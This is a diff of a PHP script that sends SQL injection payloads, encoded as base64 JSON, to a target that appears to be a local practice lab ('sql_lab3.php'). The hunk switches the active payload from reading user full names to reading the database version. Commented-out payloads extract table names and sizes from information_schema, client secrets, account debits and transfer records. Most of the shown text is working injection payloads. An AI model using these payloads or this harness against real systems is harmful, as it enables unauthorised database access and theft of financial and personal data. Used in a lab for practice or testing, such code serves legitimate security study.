@@ -15,15 +15,15 @@ $data = [
     //"param" => "(SELECT @@plugin_dir)",
     //"param"=>"(SELECT(debit)FROM(masterAccounts)LIMIT 1)",
     //"param"=>"(SELECT(COUNT(*))FROM(card_velocity_logs))",
-    //"param"=>"(SELECT(@@version))",
+    "param"=>"(SELECT(@@version))",
     //(SELECT(secret)FROM(clients)LIMIT 1 OFFSET 2)
     // "param" => "(SELECT(inserted_at)FROM(transfers)ORDER%20BY%20amount%20DESC%20LIMIT%201)",
     //"param"=>"(SELECT%20concat(TABLE_SCHEMA,'_',TABLE_NAME)TABLE_NAME%20FROM(information_schema.TABLES)ORDER%20BY(DATA_LENGTH)DESC%20LIMIT%201)",
     // "param" => "(SELECT%20ROUND(DATA_LENGTH/1048576,3)DATA_LENGTH%20FROM(information_schema.TABLES)ORDER%20BY(DATA_LENGTH)DESC%20LIMIT%201)",
-    "param" => "(SELECT(userFullNames)FROM(users)LIMIT 1 OFFSET 1)"
+    //"param" => "(SELECT(userFullNames)FROM(users)LIMIT 1 OFFSET 1)"
 ];
 $qq2 = base64_encode(json_encode($data));
-$url = 'http://localhost/kever/sql_lab3.php?ch=' . $qq2;
+$url = './sql_lab3.php?ch=' . $qq2;
 
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
